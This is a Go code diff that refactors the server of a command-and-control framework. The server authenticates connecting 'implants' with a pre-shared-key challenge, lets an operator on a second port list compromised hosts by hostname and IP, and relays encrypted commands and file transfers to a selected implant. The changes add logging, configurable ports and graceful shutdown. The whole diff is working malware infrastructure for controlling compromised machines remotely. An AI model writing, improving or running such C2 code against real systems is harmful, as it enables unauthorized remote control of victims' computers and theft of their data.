@@ -9,9 +9,12 @@ import (
 	"io/ioutil"
 	"log"
 	"net"
+	"os"
+	"os/signal"
 	"strconv"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 
 	encryption "github.com/grines/minic2/common"
@@ -35,40 +38,66 @@ var (
 )
 
 func main() {
-	//Run Health Checks
+	// Initialize logging
+	logFile, err := os.OpenFile("application.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
+	if err != nil {
+		log.Fatal("Failed to open log file:", err)
+	}
+	defer logFile.Close()
+
+	log.SetOutput(logFile)
+	log.Println("Starting the application")
+
+	// Run Health Checks
 	go healthCheckClients()
 
-	fmt.Println("Starting implant listener...")
+	// Configuration for ports
+	port1 := getEnv("PORT1", "8008")
+	port2 := getEnv("PORT2", "8009")
 
-	ln, err := net.Listen("tcp", "0.0.0.0:8008")
+	// Start implant listener
+	log.Printf("Starting implant listener on port %s...\n", port1)
+	ln, err := net.Listen("tcp", "0.0.0.0:"+port1)
 	if err != nil {
-		fmt.Println("Error listening:", err)
-		return
+		log.Fatalf("Error listening on port %s: %v\n", port1, err)
 	}
 	defer ln.Close()
 
-	go acceptLoop(ln)
+	go acceptLoopImplant(ln)
 
-	fmt.Println("Starting remote client listener...")
-	ln2, err := net.Listen("tcp", "0.0.0.0:8009")
+	// Start remote client listener
+	log.Printf("Starting remote client listener on port %s...\n", port2)
+	ln2, err := net.Listen("tcp", "0.0.0.0:"+port2)
 	if err != nil {
-		fmt.Println("Error listening on second port:", err)
-		return
+		log.Fatalf("Error listening on port %s: %v\n", port2, err)
 	}
 	defer ln2.Close()
 
-	acceptLoop2(ln2)
+	go acceptLoopRemote(ln2)
 
+	// Handle graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	<-sigChan
+
+	log.Println("Shutting down gracefully")
+}
+
+func getEnv(key, fallback string) string {
+	if value, exists := os.LookupEnv(key); exists {
+		return value
+	}
+	return fallback
 }
 
 func healthCheckClients() {
 	for {
-		time.Sleep(60 * time.Second) // Check every 30 seconds
+		time.Sleep(30 * time.Second) // Check every 30 seconds
 		clientsLock.Lock()
 		for id, client := range clients {
 			if !isClientAlive(&client) {
 				delete(clients, id)
-				fmt.Printf("Client %d is disconnected and removed\n", id)
+				log.Printf("Client %d is disconnected and removed\n", id)
 			}
 		}
 		clientsLock.Unlock()
@@ -76,40 +105,40 @@ func healthCheckClients() {
 }
 
 func isClientAlive(client *Client) bool {
-	// Example of a simple "ping" command
 	pingCommand := "ping"
 
 	// Encrypt the ping command
 	encryptedCommand, err := encryption.Encrypt(pingCommand, PSK)
 	if err != nil {
-		fmt.Println("Error encrypting ping command:", err)
+		log.Println("Error encrypting ping command:", err)
 		return false
 	}
 
 	// Send the ping command to the client
 	_, err = client.conn.Write([]byte(encryptedCommand + "\n"))
 	if err != nil {
-		fmt.Println("Error sending ping command:", err)
+		log.Println("Error sending ping command:", err)
 		return false
 	}
 
 	// Wait for a response
 	response, err := bufio.NewReader(client.conn).ReadString('\n')
 	if err != nil {
-		fmt.Println("Error reading ping response:", err)
+		log.Println("Error reading ping response:", err)
 		return false
 	}
 
 	// Decode the response
 	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
 	if err != nil {
-		fmt.Println("Error decoding1 response:", err)
+		log.Println("Error decoding response:", err)
+		return false
 	}
 
 	// Decrypt and check the response
 	decryptedResponse, err := encryption.Decrypt(string(decodedOutput), PSK)
 	if err != nil {
-		fmt.Println("Error decrypting ping response:", err)
+		log.Println("Error decrypting ping response:", err)
 		return false
 	}
 
@@ -117,19 +146,19 @@ func isClientAlive(client *Client) bool {
 	return decryptedResponse == "pong"
 }
 
-func acceptLoop2(ln net.Listener) {
+func acceptLoopRemote(ln net.Listener) {
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			fmt.Println("Error accepting connection on second port:", err)
+			log.Println("Error accepting connection on second port:", err)
 			continue
 		}
 
-		go handleNewConnection2(conn)
+		go handleNewConnectionRemote(conn)
 	}
 }
 
-func handleNewConnection2(conn net.Conn) {
+func handleNewConnectionRemote(conn net.Conn) {
 	defer conn.Close()
 
 	reader := bufio.NewReader(conn)
@@ -138,105 +167,77 @@ func handleNewConnection2(conn net.Conn) {
 		command, err := reader.ReadString('\n')
 		if err != nil {
 			if err != io.EOF {
-				fmt.Println("Error reading from connection:", err)
+				log.Println("Error reading from connection:", err)
 			}
 			break
 		}
 		command = strings.TrimSpace(command)
-		fmt.Println(command)
+		log.Println("Received command:", command) // Replaced fmt.Println with log.Println
 
 		decryptedCommand, err := encryption.Decrypt(strings.TrimSpace(command), PSK)
 		if err != nil {
 			// Handle error
-			log.Printf("Error: %s", err)
+			log.Printf("Error decrypting command: %s", err)
 			continue
 		}
-		log.Printf("Command received: %s", decryptedCommand)
+		log.Printf("Decrypted command received: %s", decryptedCommand)
 
 		if strings.HasPrefix(decryptedCommand, "current") {
 			cur := getCurrentClientId()
 			curr_string := fmt.Sprintf("%v", cur)
-			encryptedOutput, encryptErr := encryption.Encrypt(curr_string, PSK)
-			if encryptErr != nil {
-				log.Printf("Error encrypting command output: %v\n", encryptErr)
-				return
-			}
-
-			// Then, base64 encode the encrypted message
-			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
-			conn.Write([]byte(encodedOutput + "\n"))
+			sendResponseRemote(conn, curr_string)
 			continue
 		}
 
 		if strings.HasPrefix(decryptedCommand, "select ") {
-			handleSelectCommand(decryptedCommand)
+			handleSelectCommandRemote(decryptedCommand)
 			cur := getCurrentClientId()
 			curr_string := fmt.Sprintf("%v", cur)
-			encryptedOutput, encryptErr := encryption.Encrypt("Implant Active: "+curr_string, PSK)
-			if encryptErr != nil {
-				log.Printf("Error encrypting command output: %v\n", encryptErr)
-				return
-			}
-
-			// Then, base64 encode the encrypted message
-			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
-			conn.Write([]byte(encodedOutput + "\n"))
+			sendResponseRemote(conn, curr_string)
 			continue
 		}
 		if strings.HasPrefix(decryptedCommand, "list") {
-			c := listClients2()
+			c := listImplants()
 			var lines []string
 			for id, client := range c {
-				fmt.Printf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
+				log.Printf(" - Implant ID: %d, Hostname: %s, IP: %s", id, client.hostname, client.ip) // Replaced fmt.Printf with log.Printf
 				line := fmt.Sprintf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
 				lines = append(lines, line)
 			}
 			flattened := strings.Join(lines, "\n")
-			encryptedOutput, encryptErr := encryption.Encrypt(flattened, PSK)
-			if encryptErr != nil {
-				log.Printf("Error encrypting command output: %v\n", encryptErr)
-				return
-			}
-
-			// Then, base64 encode the encrypted message
-			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
-			conn.Write([]byte(encodedOutput + "\n"))
-
+			sendResponseRemote(conn, flattened)
 			continue
 		}
 		if currentClient == nil {
-			encryptedOutput, encryptErr := encryption.Encrypt("No implant selected", PSK)
-			if encryptErr != nil {
-				log.Printf("Error encrypting command output: %v\n", encryptErr)
-				return
-			}
-
-			// Then, base64 encode the encrypted message
-			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
-			conn.Write([]byte(encodedOutput + "\n"))
+			sendResponseRemote(conn, "No implant selected")
 			continue
 		}
-		//handleSelectCommand("select 1")
 
-		resp := handleClientCommand2(currentClient, command)
+		resp := handleImplantCommand(currentClient, command)
 
-		encryptedOutput, encryptErr := encryption.Encrypt(resp, PSK)
-		if encryptErr != nil {
-			log.Printf("Error encrypting command output: %v\n", encryptErr)
-			return
-		}
-
-		// Then, base64 encode the encrypted message
-		encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
-		conn.Write([]byte(encodedOutput + "\n"))
+		sendResponseRemote(conn, resp)
 	}
 }
 
-func acceptLoop(ln net.Listener) {
+func sendResponseRemote(conn net.Conn, response string) {
+	encryptedOutput, err := encryption.Encrypt(response, PSK)
+	if err != nil {
+		log.Printf("Error encrypting response: %v", err)
+		return
+	}
+
+	encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
+	_, err = conn.Write([]byte(encodedOutput + "\n"))
+	if err != nil {
+		log.Printf("Error sending encrypted response: %v", err)
+	}
+}
+
+func acceptLoopImplant(ln net.Listener) {
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			fmt.Println("Error accepting connection:", err)
+			log.Println("Error accepting connection:", err)
 			continue
 		}
 
@@ -247,15 +248,15 @@ func acceptLoop(ln net.Listener) {
 		// Read the response
 		response, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
-			fmt.Println("Error reading response:", err)
+			log.Println("Error reading response:", err)
 			conn.Close()
 			continue
 		}
 
 		// Validate the response
-		expectedResponse := generateResponse2(challenge, PSK)
+		expectedResponse := generateResponseAuth(challenge, PSK)
 		if strings.TrimSpace(response) != expectedResponse {
-			fmt.Println("Authentication failed")
+			log.Println("Authentication failed")
 			conn.Close()
 			continue
 		}
@@ -277,26 +278,20 @@ func acceptLoop(ln net.Listener) {
 		clients[clientID] = c
 		clientsLock.Unlock()
 
-		fmt.Printf("New implant connected: %d, Hostname: %s, IP: %s\n", clientID, hostname, ip)
+		log.Printf("New implant connected: %d, Hostname: %s, IP: %s\n", clientID, hostname, ip)
 	}
 }
 
-func generateResponse2(challenge string, psk string) string {
-	// Should be the same implementation as in payload.go
-	hash := sha256.Sum256([]byte(challenge + psk))
-	return fmt.Sprintf("%x", hash)
-}
-
-func handleSelectCommand(command string) {
+func handleSelectCommandRemote(command string) {
 	parts := strings.SplitN(command, " ", 2)
 	if len(parts) != 2 {
-		fmt.Println("Invalid select command. Use 'select <implant_id>'")
+		log.Println("Invalid select command. Use 'select <implant_id>'")
 		return
 	}
 
 	id, err := strconv.Atoi(parts[1])
 	if err != nil {
-		fmt.Println("Invalid implant ID:", parts[1])
+		log.Println("Invalid implant ID:", parts[1])
 		return
 	}
 
@@ -305,140 +300,91 @@ func handleSelectCommand(command string) {
 	clientsLock.Unlock()
 
 	if !ok {
-		fmt.Println("No implant with ID:", id)
+		log.Println("No implant with ID:", id)
 		return
 	}
 
 	currentClient = &client
-	fmt.Printf("Selected implant %d\n", id)
+	log.Printf("Selected implant %d\n", id)
 }
 
-func handleClientCommand2(client *Client, command string) string {
+func handleImplantCommand(client *Client, command string) string {
 	// Send the command to the server
 	_, err := client.conn.Write([]byte(command + "\n"))
 	if err != nil {
-		fmt.Println("Error sending command:", err)
-		//removeClient2(client.id)
+		log.Println("Error sending command:", err)
 	}
 
 	// Read the response from the server
 	response, err := bufio.NewReader(client.conn).ReadString('\n')
 	if err != nil {
-		fmt.Println("Error sending command:", err)
-		//removeClient2(client.id) // Pass rl here
+		log.Println("Error receiving response:", err)
 	}
-	fmt.Println("1")
-	fmt.Println(response)
 
 	// Decode the response
 	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
 	if err != nil {
-		fmt.Println("Error decoding1 response:", err)
+		log.Println("Error decoding response:", err)
 	}
 
-	fmt.Println("2")
-	fmt.Println(decodedOutput)
-
-	// In handleClientCommand, after receiving the response
+	// Decrypt the response
 	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), PSK)
 	if err != nil {
-		fmt.Println("Error decrypting2 response:", err)
+		log.Println("Error decrypting response:", err)
 	}
-
-	fmt.Println("3")
-	fmt.Println(decryptedOutput)
 
 	return string(decryptedOutput)
 }
 
-func requestCurrentDirectory(client *Client) {
-
-	if client == nil {
-		return // Do nothing if the client is nil
-	}
-
-	//Encrypt it
-	encryptedCommand, err := encryption.Encrypt("pwd", PSK)
-	if err != nil {
-		fmt.Println("Error encrypting command:", err)
-	}
-
-	// Send the command to the server
-	_, err = client.conn.Write([]byte(encryptedCommand + "\n"))
-	if err != nil {
-		fmt.Println("Error sending command:", err)
-	}
-	// Read the response (current directory) from the client
-	dirResponse, err := bufio.NewReader(client.conn).ReadString('\n')
-	if err != nil {
-		fmt.Println("Error reading directory response:", err)
-		return
-	}
-
-	// Decode the response
-	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(dirResponse))
-	if err != nil {
-		fmt.Println("Error decoding response:", err)
-	}
-
-	// In handleClientCommand, after receiving the response
-	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), PSK)
-	if err != nil {
-		fmt.Println("Error decrypting response:", err)
-	}
-
-	client.dir = decryptedOutput
-}
-
-func listClients2() map[int]Client {
+func listImplants() map[int]Client {
 	clientsLock.Lock()
 	defer clientsLock.Unlock()
 
 	if len(clients) == 0 {
-		fmt.Println("No implants connected.")
+		log.Println("No implants connected.")
 		return nil
 	}
 
-	fmt.Println("Connected implants:")
+	log.Println("Connected implants:")
 	for id, client := range clients {
-		fmt.Printf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
+		log.Printf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
 	}
 	return clients
 }
 
-func removeClient2(id int) {
+func removeImplant(id int) {
 	clientsLock.Lock()
 	defer clientsLock.Unlock()
 
 	delete(clients, id)
-	fmt.Printf("Implant %d disconnected\n", id)
+	log.Printf("Implant %d disconnected\n", id)
 
 	if currentClient != nil && currentClient.id == id {
 		currentClient = nil
 	}
 }
 
-func saveDownloadedFile(command, content string) {
+func saveFile(command, content string) {
 	parts := strings.Fields(command)
 	if len(parts) < 2 {
-		fmt.Println("Invalid download command")
+		log.Println("Invalid download command")
 		return
 	}
 
 	fileName := parts[1] // Assuming the file name is the second part of the command
 	err := ioutil.WriteFile(fileName, []byte(content), 0644)
 	if err != nil {
-		fmt.Println("Error saving file:", err)
+		log.Println("Error saving file:", err)
 		return
 	}
 
-	fmt.Printf("File %s downloaded successfully\n", fileName)
+	log.Printf("File %s downloaded successfully\n", fileName)
 }
 
-func handleFileUpload(client *Client, command string) bool {
+func handleUpload(client *Client, command string) bool {
 	parts := strings.Fields(command)
 	if len(parts) != 3 {
-		fmt.Println("Usage: upload <localpath> <remotepath>")
+		log.Println("Usage: upload <localpath> <remotepath>")
 		return false
 	}
 
@@ -446,7 +392,7 @@ func handleFileUpload(client *Client, command string) bool {
 
 	fileData, err := ioutil.ReadFile(localPath)
 	if err != nil {
-		fmt.Println("Error reading file:", err)
+		log.Println("Error reading file:", err)
 		return false
 	}
 
@@ -455,16 +401,23 @@ func handleFileUpload(client *Client, command string) bool {
 
 	_, err = client.conn.Write([]byte(uploadCommand + "\n"))
 	if err != nil {
-		fmt.Println("Error sending upload command:", err)
+		log.Println("Error sending upload command:", err)
 		return false
 	}
 
 	return true
 }
 
+// getCurrentClientId remains unchanged
 func getCurrentClientId() int {
 	if currentClient != nil {
 		return currentClient.id
 	}
 	return -1 // Return -1 or any other value to indicate that no client is currently selected
+}
+
+func generateResponseAuth(challenge string, psk string) string {
+	// Should be the same implementation as in payload.go
+	hash := sha256.Sum256([]byte(challenge + psk))
+	return fmt.Sprintf("%x", hash)
 }
